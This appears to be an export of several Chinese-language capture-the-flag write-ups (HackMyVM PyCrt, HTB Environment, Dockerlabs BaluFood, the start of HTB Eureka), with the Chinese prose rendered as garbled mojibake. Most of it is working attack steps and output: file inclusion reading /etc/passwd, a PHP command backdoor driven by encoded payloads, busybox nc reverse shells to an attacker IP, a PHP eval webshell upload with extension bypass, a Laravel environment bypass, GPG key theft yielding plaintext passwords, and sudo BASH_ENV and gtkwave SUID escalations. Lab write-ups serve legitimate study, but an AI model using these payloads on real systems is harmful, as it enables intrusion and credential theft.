\u0026#34;http://192.168.55.36/ShadowSec/bydataset.php?file=/etc/passwd\u0026#34;\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\rsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\rsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\rsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\rpycrtlake:x:1000:1000:pycrtlake,,,:/home/pycrtlake:/bin/bash\rsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\rmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\rsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\rchatlake:x:1001:1001::/home/chatlake:/bin/sh Own www-data #\ræŸ¥çœ‹ä¸€ä¸‹bydataset.phpçš„æºç å‘¢\n[root@kali] /home/kali â¯ curl \u0026#34;http://192.168.55.36/ShadowSec/bydataset.php?file=php://filter/convert.base64-encode/resource=bydataset.php\u0026#34; | base64 -d\r% Total % Received % Xferd Average Speed Time Time Time Current\rDload Upload Total Spent Left Speed\r100 1736 100 1736 0 0 947k 0 --:--:-- --:--:-- --:--:-- 1695k\r\u0026lt;?php\rfunction decrypt($input) {\r$reversed = strrev($input);\recho \u0026#34;Reversed: \u0026#34; . $reversed . \u0026#34;\\n\u0026#34;;\r$decoded = base64_decode($reversed);\recho \u0026#34;Decoded: \u0026#34; . $decoded . \u0026#34;\\n\u0026#34;;\rif ($decoded === false) {\recho \u0026#34;Base64 decoding failed.\\n\u0026#34;;\rreturn false;\r}\rif (strpos($decoded, \u0026#39;cmd:\u0026#39;) === 0) {\rreturn substr($decoded, 4);\r}\rreturn false;\r}\rif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;GET\u0026#39; \u0026amp;\u0026amp; isset($_GET[\u0026#39;file\u0026#39;])) {\r$file = $_GET[\u0026#39;file\u0026#39;];\rif (stripos($file, \u0026#39;phpinfo\u0026#39;) !== false) {\rexit(\u0026#39;Access Denied\u0026#39;);\r}\r$filterUrl = \u0026#39;php://filter/convert.base64-encode/resource=\u0026#39; . $file;\r$data = @file_get_contents($filterUrl);\rif ($data === false) {\rexit(\u0026#39;Failed to read file\u0026#39;);\r}\recho base64_decode($data);\rexit;\r} elseif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;auth\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;payload\u0026#39;])) {\r$auth = $_POST[\u0026#39;auth\u0026#39;];\r$payload = $_POST[\u0026#39;payload\u0026#39;];\rif ($auth !== \u0026#39;LetMeIn123!\u0026#39;) {\rexit(\u0026#39;Invalid Auth Token.\u0026#39;);\r}\r$command = decrypt($payload);\rif ($command !== false) {\r$output = exec($command);\recho \u0026#34;\u0026lt;pre\u0026gt;$output\u0026lt;/pre\u0026gt;\u0026#34;;\r} else {\recho \u0026#34;Payload decode failed.\\n\u0026#34;;\r}\rexit;\r} else {\recho \u0026#34;Nothing to see here.\u0026#34;;\r}\r?\u0026gt; é€»è¾‘å¾ˆç®€å•ï¼Œå¯ä»¥ç›´æ¥å‘½ä»¤è¡Œè¯·æ±‚\n[root@kali] /home/kali â¯ curl -X POST http://192.168.55.36/ShadowSec/bydataset.php \\\r-d \u0026#39;auth=LetMeIn123!\u0026#39; \\\r-d \u0026#34;payload=$(echo -n \u0026#39;cmd:id\u0026#39; | base64 | rev)\u0026#34;\rReversed: Y21kOmlk\rDecoded: cmd:id\r\u0026lt;pre\u0026gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)\u0026lt;/pre\u0026gt;# è·å–åå¼¹shell\n[root@kali] /home/kali/Desktop â¯ curl -X POST http://192.168.55.36/ShadowSec/bydataset.php \\\r-d \u0026#39;auth=LetMeIn123!\u0026#39; \\\r-d \u0026#34;payload=$(echo -n \u0026#39;cmd:busybox nc 192.168.55.4 4444 -e /bin/bash\u0026#39; | base64 | rev)\u0026#34; Own chatlake #\ræŸ¥çœ‹sudo -l\nwww-data@PyCrt:/var/www/html/ShadowSec$ sudo -l\rMatching Defaults entries for www-data on PyCrt:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser www-data may run the following commands on PyCrt:\r(chatlake) NOPASSWD: /usr/bin/weecha ç›´æ¥è¿è¡Œï¼Œå‘ç°å­˜åœ¨execå‘½ä»¤æ‰§è¡Œçš„é€‰é¡¹\n/exec id /exec busybox nc 192.168.55.4 8888 -e /bin/bash Own pycrtlake #\ræŸ¥çœ‹sudo -l\nchatlake@PyCrt:~$ sudo -l\rMatching Defaults entries for chatlake on PyCrt:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser chatlake may run the following commands on PyCrt:\r(ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service æ²¡æœ‰å†™å…¥æƒé™ï¼Œæ‰§è¡Œä¹‹åï¼Œå›åˆ°irssiè¿æ¥ï¼ŒæŸ¥çœ‹é¢‘é“ä¼šå¤šå‡ºæ¥å‡ ä¸ª\n/list è¿›å…¥åˆ°#chan6é¢‘é“ï¼Œè¿‡ä¸€ä¼šä¼šæœ‰ä¸€ä¸ªæœºå™¨äººä¿¡æ¯\nçœ‹æ¥éœ€è¦åˆ‡æ¢IDï¼Œä¹‹å‰åœ¨/ShadowSecå‰ç«¯é¡µé¢ä¸­å­˜åœ¨ä¸€ä¸ªIDä¸ºï¼šll104567\n/nick ll104567 åœ¨é¢‘é“ä¸­å‘ä¿¡æ¯æ²¡æœ‰ä»»ä½•ç”¨ï¼Œéœ€è¦åˆ‡åˆ°å…¶ä»–é¢‘é“é‡Œé¢å‘ä¿¡æ¯ï¼Œç„¶åç§èŠadminä¼šå¾—åˆ°å›æ˜¾\n/query admin //ç§èŠ\r/q //é€€å‡ºç§èŠ è¿™æ˜¯æˆ‘è¾“å…¥id:)çš„ç»“æœ\nè¿™æ˜¯æˆ‘è¾“å…¥123:)çš„ç»“æœ\nçœ‹èµ·æ¥åªèƒ½è¾“å…¥æ•°å­—å‘¢ï¼Œç»è¿‡å°è¯•åˆ‡æ¢åˆ°#chan1æ‰æ˜¯æœ‰ç”¨çš„\nè¿™æ˜¯è¾“å…¥123:)çš„ç»“æœï¼Œä¼¼ä¹æ˜¯æ˜ å°„åˆ°äº†ç‰¹æ®Šå­—ç¬¦ä¸Š\nç»è¿‡éªŒè¯ï¼Œå…¶ä¸­çš„é€»è¾‘å°±æ˜¯ASCIIç è½¬æ¢\nè¿™æ˜¯whoamiçš„æ‰§è¡Œç»“æœ\nåŒæ ·å°†busyboxè½¬ç ä¹‹åæ‰§è¡Œå³å¯ï¼Œä½†æ˜¯è¿™é‡Œä¸¤ä¸‹å°±æ–­äº†\næ‹¼æ‰‹é€Ÿå§ï¼Œå†å¼¹ä¸€ä¸ªshell\nRoot #\ræŸ¥çœ‹sudo -l\npycrtlake@PyCrt:/usr/local/bin$ sudo /usr/bin/gtkwave -f /root/root.txt Could not initialize GTK! Is DISPLAY env var/xhost set?\rUsage: /usr/bin/gtkwave [OPTION]... [DUMPFILE] [SAVEFILE] [RCFILE]\r-n, --nocli=DIRPATH use file requester for dumpfile name\r-f, --dump=FILE specify dumpfile name\r-F, --fastload generate/use VCD recoder fastload files\r-o, --optimize optimize VCD to FST\r-a, --save=FILE specify savefile name\r-A, --autosavename assume savefile is suffix modified dumpfile name\r-r, --rcfile=FILE specify override .rcfile name\r-d, --defaultskip if missing .rcfile, do not use useful defaults\r-D, --dualid=WHICH specify multisession identifier\r-l, --logfile=FILE specify simulation logfile name for time values\r-s, --start=TIME specify start time for LXT2/VZT block skip\r-e, --end=TIME specify end time for LXT2/VZT block skip\r-t, --stems=FILE specify stems file for source code annotation\r-c, --cpu=NUMCPUS specify number of CPUs for parallelizable ops\r-N, --nowm disable window manager for most windows\r-M, --nomenus do not render menubar (for making applets)\r-S, --script=FILE specify Tcl command script file for execution\r-T, --tcl_init=FILE specify Tcl command script file to be loaded on startup\r-W, --wish enable Tcl command line on stdio\r-R, --repscript=FILE specify timer-driven Tcl command script file\r-P, --repperiod=VALUE specify repscript period in msec (default: 500)\r-X, --xid=XID specify XID of window for GtkPlug to connect to\r-1, --rpcid=RPCID specify RPCID of GConf session\r-2, --chdir=DIR specify new current working directory\r-3, --restore restore previous session\r-4, --rcvar specify single rc variable values individually\r-5, --sstexclude specify sst exclusion filter filename\r-I, --interactive interactive VCD mode (filename is shared mem ID)\r-C, --comphier use compressed hierarchy names (slower)\r-g, --giga use gigabyte mempacking when recoding (slower)\r-L, --legacy use legacy VCD mode rather than the VCD recoder\r-v, --vcd use stdin as a VCD dumpfile\r-O, --output=FILE specify filename for stdout/stderr redirect\r-z, --slider-zoom enable horizontal slider stretch zoom\r-V, --version display version banner then exit\r-h, --help display this help then exit\r-x, --exit exit after loading trace (for loader benchmarks)\rVCD files and save files may be compressed with zip or gzip.\rGHW files may be compressed with gzip or bzip2.\rOther formats must remain uncompressed due to their non-linear access.\rNote that DUMPFILE is optional if the --dump or --nocli options are specified.\rSAVEFILE and RCFILE are always optional.\rReport bugs to \u0026lt;bybell@rocketmail.com\u0026gt;. å½“å‰ç¯å¢ƒæ—  X æ˜¾ç¤ºæ”¯æŒï¼Œè¯¥å‘½ä»¤ä»å¯èƒ½å¤±è´¥ï¼Œéœ€è¦ä¼ªé€ ä¸€ä¸‹Xvfbï¼Œå½“å‰ç¯å¢ƒæœ‰Xvfb-run\néœ€è¦å†™å…¥ä¸€ä¸ª-Sè„šæœ¬\npycrtlake@PyCrt:~$ cat poc exec bash -c \u0026#34;chmod u+s /bin/bash\u0026#34; ç„¶åé€šè¿‡xvfbè¿è¡Œå³å¯\npycrtlake@PyCrt:~$ xvfb-run sudo /usr/bin/gtkwave -S ./poc GTKWave Analyzer v3.3.118 (w)1999-2023 BSI\rGTKWAVE | Use the -h, --help command line flags to display help.\r(gtkwave:801): dconf-WARNING **: 06:16:55.663: failed to commit changes to dconf: Failed to execute child process ?dbus-launch? (No such file or directory)\rGTKWAVE | Executing Tcl script \u0026#39;./poc\u0026#39; Summary #\rUser: è¿æ¥ircæœåŠ¡å™¨å¾—åˆ°éšè—ç›®å½•ï¼Œfuzzä¸€ä¸‹å‚æ•°å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œè¯»å‡ºphpæºç ã€‚chatlakeå¯ä»¥ç›´æ¥é€šè¿‡weechatçš„execè¿›è¡Œåå¼¹ã€‚æœ€åå°±æ˜¯pycrtlakeéœ€è¦è¿›å…¥åˆ°é¢‘é“é‡Œï¼Œé€šè¿‡asciiç è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚\nRoot: å‚æ•°å­˜åœ¨-Så¼•å…¥è„šæœ¬ï¼Œç›´æ¥å†™å…¥æ¶æ„å‘½ä»¤å³å¯ã€‚\n","date":"2025-05-11","externalUrl":null,"permalink":"/posts/2025/05/hackmyvm-pycrt/","section":"Posts","summary":"","title":"HackMyVM-Pycrt","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Environment â¯ nmap Environment.htb -sV -A\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)\r|_ 256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)\r80/tcp open http nginx 1.22.1\r|_http-title: Save the Environment | environment.htb\r|_http-server-header: nginx/1.22.1 Dirsearch #\r[root@kali] /home/kali/Environment â¯ dirsearch -u http://environment.htb _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289\rTarget: http://environment.htb/\r[07:23:08] Scanning: [07:23:23] 403 - 555B - /admin/.config [07:23:23] 403 - 555B - /admin/.htaccess\r[07:23:39] 403 - 555B - /administrator/.htaccess [07:23:43] 403 - 555B - /admpar/.ftppass [07:23:43] 403 - 555B - /admrev/.ftppass\r[07:23:46] 403 - 555B - /app/.htaccess [07:23:52] 403 - 555B - /bitrix/.settings.bak [07:23:52] 403 - 555B - /bitrix/.settings\r[07:23:52] 403 - 555B - /bitrix/.settings.php.bak [07:23:54] 301 - 169B - /build -\u0026gt; http://environment.htb/build/ [07:23:54] 403 - 555B - /build/ [07:24:15] 403 - 555B - /ext/.deps [07:24:15] 200 - 0B - /favicon.ico [07:24:26] 200 - 4KB - /index.php [07:24:26] 200 - 2KB - /index.php/login/ [07:24:31] 403 - 555B - /lib/flex/varien/.project [07:24:31] 403 - 555B - /lib/flex/uploader/.actionScriptProperties\r[07:24:31] 403 - 555B - /lib/flex/varien/.flexLibProperties\r[07:24:31] 403 - 555B - /lib/flex/varien/.actionScriptProperties\r[07:24:31] 403 - 555B - /lib/flex/uploader/.flexProperties\r[07:24:31] 403 - 555B - /lib/flex/uploader/.project\r[07:24:31] 403 - 555B - /lib/flex/uploader/.settings\r[07:24:31] 403 - 555B - /lib/flex/varien/.settings\r[07:24:34] 200 - 2KB - /login [07:24:34] 200 - 2KB - /login/ [07:24:35] 302 - 358B - /logout/ -\u0026gt; http://environment.htb/login [07:24:35] 302 - 358B - /logout -\u0026gt; http://environment.htb/login [07:24:36] 403 - 555B - /mailer/.env [07:25:01] 403 - 555B - /resources/sass/.sass-cache/ [07:25:01] 403 - 555B - /resources/.arch-internal-preview.css\r[07:25:02] 200 - 24B - /robots.txt [07:25:12] 301 - 169B - /storage -\u0026gt; http://environment.htb/storage/ [07:25:12] 403 - 555B - /storage/\r[07:25:19] 403 - 555B - /twitter/.env [07:25:21] 405 - 244KB - /upload/ [07:25:22] 405 - 244KB - /upload [07:25:24] 403 - 555B - /vendor/ Task Completed Env Bypass #\rè¿›å…¥ç™»å½•é¡µï¼Œè¿›è¡ŒæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°ç›´æ¥å¸¦å‡ºäº†æŠ¥é”™ä¿¡æ¯\nPOST /login HTTP/1.1\rHost: environment.htb\r_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx\u0026amp;email=a%40a.c\u0026amp;password=123 å¹¶ä¸”è¿™é‡Œæ³¨æ„ä¸€ä¸‹é€»è¾‘ï¼Œå¹¶æ²¡æœ‰å†™elseçš„æƒ…å†µ\nif($remember == \u0026#39;False\u0026#39;) {\r$keep_loggedin = False;\r} elseif ($remember == \u0026#39;True\u0026#39;) {\r$keep_loggedin = True;\r} å› æ­¤å°è¯•ç»™ä»–éšä¾¿èµ‹ä¸€ä¸ªå€¼\nPOST /login HTTP/1.1\rHost: environment.htb\r_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx\u0026amp;email=a%40a.c\u0026amp;password=123\u0026amp;remember=111 è¿™æ®µä»£ç çš„æ„æ€æ˜¯åœ¨ Laravel ä¸­ï¼Œå¦‚æœå½“å‰ç¯å¢ƒæ˜¯ \u0026quot;preprod\u0026quot;ï¼ˆé¢„ç”Ÿäº§ç¯å¢ƒï¼‰ï¼Œå°±è‡ªåŠ¨ç™»å½•ä¸º user_id = 1 çš„ç”¨æˆ·ï¼Œå¹¶è·³è½¬åˆ°ç®¡ç†åå°é¡µé¢ã€‚\nå°è¯•æœç´¢ä¸€ä¸‹å¦‚ä½•ç»•è¿‡ğŸ‘‡\nEnvironment manipulation via query string in Laravel\nNyamort/CVE-2024-52301\nåªéœ€è¦ä¼ å…¥GETå‚æ•°å³å¯ç»•è¿‡\nPOST /login?--env=preprod HTTP/1.1\rHost: environment.htb\r_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx\u0026amp;email=a%40a.c\u0026amp;password=123\u0026amp;remember=True File Upload #\ræ¥åˆ°profileè¿›è¡Œä¸Šä¼ æœ¨é©¬\n-----------------------------60487661513624885101007722530\rContent-Disposition: form-data; name=\u0026#34;upload\u0026#34;; filename=\u0026#34;shell.phtml\u0026#34;\rContent-Type: image/jpg\rGIF89a\r\u0026lt;?php eval($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\r-----------------------------60487661513624885101007722530-- æˆåŠŸç»•è¿‡ğŸ‘‡\nä½†æ˜¯å‘¢ï¼Œé€šè¿‡urlè®¿é—®åªä¼šæŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œè¿™é‡Œéœ€è¦åœ¨phpåé¢å†åŠ ä¸€ä¸ªç‚¹æ‰èƒ½ç»•è¿‡\n-----------------------------168307501742120550952749914248\rContent-Disposition: form-data; name=\u0026#34;upload\u0026#34;; filename=\u0026#34;123.php.\u0026#34;\rContent-Type: image/jpg\rGIF89a\r\u0026lt;?php eval($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\r-----------------------------168307501742120550952749914248-- å¯ä»¥ç›´æ¥è¯»å–åˆ°user.txt\nwww-data@environment:/home/hish$ ls -al\rtotal 36\rdrwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .\rdrwxr-xr-x 3 root root 4096 Jan 12 11:51 ..\rlrwxrwxrwx 1 root root 9 Apr 7 19:29 .bash_history -\u0026gt; /dev/null\r-rw-r--r-- 1 hish hish 220 Jan 6 21:28 .bash_logout\r-rw-r--r-- 1 hish hish 3526 Jan 12 14:42 .bashrc\rdrwxr-xr-x 4 hish hish 4096 May 7 21:48 .gnupg\rdrwxr-xr-x 3 hish hish 4096 Jan 6 21:43 .local\r-rw-r--r-- 1 hish hish 807 Jan 6 21:28 .profile\rdrwxr-xr-x 2 hish hish 4096 Jan 12 11:49 backup\r-rw-r--r-- 1 root hish 33 May 7 21:46 user.txt\rwww-data@environment:/home/hish$ cat user.txt 985363b5exxxxxxxxxxx Own hish #\ræŸ¥çœ‹åˆ°backupç›®å½•é‡Œæœ‰ä¸€ä¸ªgpgæ–‡ä»¶\nwww-data@environment:/home/hish/backup$ ls -al\rtotal 12\rdrwxr-xr-x 2 hish hish 4096 Jan 12 11:49 .\rdrwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..\r-rw-r--r-- 1 hish hish 430 May 7 21:48 keyvault.gpg ç”±äºå½“å‰www-dataç”¨æˆ·æ— æ³•åœ¨/var/wwwç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶ï¼Œå› æ­¤æŒ‡å®šç›®å½•\n# 1. æ‹·è´ hish ç”¨æˆ·çš„å¯†é’¥ç›®å½•\rcp -r /home/hish/.gnupg /tmp/mygnupg\r# 2. è®¾ç½®æƒé™\rchmod -R 700 /tmp/mygnupg\r# 3. ç¡®è®¤æ˜¯å¦å­˜åœ¨ç§é’¥\rgpg --homedir /tmp/mygnupg --list-secret-keys\r# 4. è§£å¯† keyvault.gpg\rgpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg è·å–åˆ°message.txtï¼Œå…¶ä¸­å°±æœ‰å¯†ç \nwww-data@environment:/tmp$ cat message.txt PAYPAL.COM -\u0026gt; Ihaves0meMon$yhere123\rENVIRONMENT.HTB -\u0026gt; marineSPm@ster!! // password !!!\rFACEBOOK.COM -\u0026gt; summerSunnyB3ACH!! Root #\ræŸ¥çœ‹sudo -l\nhish@environment:~$ sudo -l\r[sudo] password for hish: Matching Defaults entries for hish on environment:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=\u0026#34;ENV BASH_ENV\u0026#34;, use_pty\rUser hish may run the following commands on environment:\r(ALL) /usr/bin/systeminfo å…¶ä¸­å¯ä»¥çœ‹åˆ°env_keepä¿ç•™äº†ENVå’ŒBASH_ENVä¸¤ä¸ªç¯å¢ƒå˜é‡å› æ­¤å¯ä»¥ç”¨äºç»•è¿‡\nhish@environment:~$ echo \u0026#39;bash -p\u0026#39; \u0026gt; exp.sh\rhish@environment:~$ chmod +x exp.sh hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo root@environment:/home/hish# id\ruid=0(root) gid=0(root) groups=0(root)\rroot@environment:/home/hish# cat /root/root.txt 943dd249259dxxxxxxxxxxxx\rroot@environment:/home/hish# Summary #\rUser: ç™»å½•æŠ¥é”™ä¿¡æ¯ä¸­æ³„éœ²å‡ºæºç ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡è¿›è¡Œç»•è¿‡ç™»å½•ã€‚åå°ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œåç¼€ç”¨ç‚¹ç»•è¿‡è·å¾—www-dataæƒé™ï¼Œbackupç›®å½•ä¸­æ³„éœ²äº†gpgæ–‡ä»¶ï¼Œå¹¶ä¸”å¯†é’¥å¯è¯»ï¼Œå¯ä»¥ç›´æ¥è§£å¯†åˆ°hishçš„å¯†ç ã€‚\nRoot: sudoç¯å¢ƒå˜é‡å¼•å…¥ã€‚\nè¿™ä¸ªæœºå™¨å¦‚å…¶åï¼Œå’Œç¯å¢ƒæœ‰å…³ã€‚\n","date":"2025-05-07","externalUrl":null,"permalink":"/posts/2025/05/htb-environment/","section":"Posts","summary":"","title":"HTB-Environment","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/balufood â¯ nmap 172.17.0.2 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 69:15:7d:34:74:1c:21:8a:cb:2c:a2:8c:42:a4:21:7f (ECDSA)\r|_ 256 a7:3a:c9:b2:ac:cf:44:77:a7:9c:ab:89:98:c7:88:3f (ED25519)\r5000/tcp open http Werkzeug httpd 2.2.2 (Python 3.11.2)\r|_http-server-header: Werkzeug/2.2.2 Python/3.11.2\r|_http-title: Restaurante Balulero - Inicio Weak Pass #\rè¿›å…¥åˆ°172.17.0.2:5000/login\nusername:admin\rpassword:admin å¯ä»¥sshç™»å½•\n[root@kali] /home/kali/balufood â¯ ssh sysadmin@172.17.0.2 The authenticity of host \u0026#39;172.17.0.2 (172.17.0.2)\u0026#39; can\u0026#39;t be established.\rED25519 key fingerprint is SHA256:ZcJw57pSEVAGdPKcg6E5FVaWh/s1IMKnuLnTky7h3xQ.\rThis key is not known by any other names.\rAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\rWarning: Permanently added \u0026#39;172.17.0.2\u0026#39; (ED25519) to the list of known hosts.\rsysadmin@172.17.0.2\u0026#39;s password: Linux 880b1afd5905 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64\rThe programs included with the Debian GNU/Linux system are free software;\rthe exact distribution terms for each program are described in the\rindividual files in /usr/share/doc/*/copyright.\rDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\rpermitted by applicable law.\rLast login: Tue Apr 29 13:02:47 2025 from 172.17.0.1\rsysadmin@880b1afd5905:~$ ls\rapp.py restaurant.db static templates Own balulero #\rè¯»å–app.pyå¯ä»¥å¾—åˆ°å¯†é’¥\nsysadmin@880b1afd5905:~$ cat app.py from flask import Flask, render_template, redirect, url_for, request, session, flash\rimport sqlite3\rfrom functools import wraps\rapp = Flask(__name__)\rapp.secret_key = \u0026#39;cuidaditocuidadin\u0026#39;\rDATABASE = \u0026#39;restaurant.db\u0026#39;\r........ å¯ä»¥åˆ‡æ¢åˆ°baluleroç”¨æˆ·\nsysadmin@880b1afd5905:~$ su balulero\rPassword: balulero@880b1afd5905:/home/sysadmin$ ls\rls: cannot open directory \u0026#39;.\u0026#39;: Permission denied\rbalulero@880b1afd5905:/home/sysadmin$ cd ~ balulero@880b1afd5905:~$ ls\rbalulero@880b1afd5905:~$ ls -al\rtotal 28\rdrwx------ 3 balulero balulero 4096 Apr 29 12:58 .\rdrwxr-xr-x 1 root root 4096 Apr 29 12:56 ..\r-rw------- 1 balulero balulero 113 Apr 29 13:03 .bash_history\r-rw-r--r-- 1 balulero balulero 220 Apr 29 12:55 .bash_logout\r-rw-r--r-- 1 balulero balulero 3572 Apr 29 12:58 .bashrc\rdrwxr-xr-x 3 balulero balulero 4096 Apr 29 12:57 .local\r-rw-r--r-- 1 balulero balulero 807 Apr 29 12:55 .profile\rbalulero@880b1afd5905:~$ Root #\ræ³¨æ„åˆ°bash_historyä¸­å¯¹bashrcè¿›è¡Œäº†ä¿®æ”¹\nbalulero@880b1afd5905:~$ cat .bash_history nano ~/.bashrc\rapt install nano -y\rexit\rnano ~/.bashrc\rsource nano ~/.bashrc\rsource ~/.bashrc\ralias\rsu root\rexit åœ¨æœ€åä¸€è¡Œçœ‹åˆ°rootå¯†ç \nbalulero@880b1afd5905:~$ cat .bashrc ...\r...\r...\ralias ser-root=\u0026#39;echo chocolate2 | su - root\u0026#39;\rbalulero@880b1afd5905:~$ su root Password: root@880b1afd5905:/home/balulero# id\ruid=0(root) gid=0(root) groups=0(root) Summary #\rå¾ˆç®€å•äº†ï¼Œå°±ä¸æ€»ç»“äº†ã€‚\n","date":"2025-05-01","externalUrl":null,"permalink":"/posts/2025/05/dockerlabs-balufood/","section":"Posts","summary":"","title":"Dockerlabs-BaluFood","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Eureka â¯ nmap Eureka.htb -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)\r| 256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)\r|_ 256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)\r80/tcp open http nginx 1.18.0 (Ubuntu)\r|_http-title: Did not follow redirect to http://furni.htb/\r|_http-server-header: nginx/1.18.0 (Ubuntu) æ·»åŠ furni.htbåˆ°**/etc/hosts**\nNuclei #\r[root@kali] /home/kali/Eureka â¯ nuclei -u http://furni.htb\r__ _\r____ __ _______/ /__ (_)\r/ __ \\/ / / / ___/ / _ \\/ /\r/ / / / /_/ / /__/ / __/ /\r/_/ /_/\\__,_/\\___/_/\\___/_/ v3.4.2\rprojectdiscovery.io\r[INF] Current nuclei version: v3.4.2 (latest)\r[INF] Current nuclei-templates version: v10.2.0 (latest)\r[WRN] Scan results upload to cloud is disabled.\r[INF] New templates added in latest release: 268\r[INF] Templates loaded for current scan: 7894\r[INF] Executing 7697 signed templates from projectdiscovery/nuclei-templates\r[WRN] Loading 197 unsigned templates for scan. Use with caution.\r[INF] Targets loaded for current scan: 1\r[INF] Templates clustered: 1730 (Reduced 1626 Requests)\r[INF] Using Interactsh Server: oast.me\r[missing-sri] [http] [info] http://furni.htb [\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css\u0026#34;]\r[waf-detect:nginxgeneric] [http] [info] http://furni.htb\r[springboot-heapdump] [http] [critical] http://furni.htb/actuator/heapdump\r[ssh-auth-methods] [javascript] [info] furni.htb:22 [\u0026#34;[\u0026#34;publickey\u0026#34;,\u0026#34;password\u0026#34;]\u0026#34;]\r[ssh-password-auth] [javascript] [info] furni.htb:22\r[ssh-sha1-hmac-algo] [javascript] [info] furni.htb:22\r[ssh-server-enumeration] [javascript] [info] furni.htb:22 [\u0026#34;SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12\u0026#34;]\r[openssh-detect] [tcp] [info] furni.htb:22 [\u0026#34;SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12\u0026#34;]\r[springboot-features] [http] [low] http://furni.htb/actuator/features\r[nginx-version] [http] [info] http://furni.htb [\u0026#34;nginx/1.18.0\u0026#34;]\r[spring-detect] [http] [info] http://furni.htb/error\r[springboot-configprops] [http] [low] http://furni.htb/actuator/configprops\r[springboot-threaddump] [http] [low] http://furni.htb/actuator/threaddump\r[springboot-beans] [http] [low] http://furni.htb/actuator/beans ä¸‹è½½è¿™ä¸ªheapdump\nJDumpspider 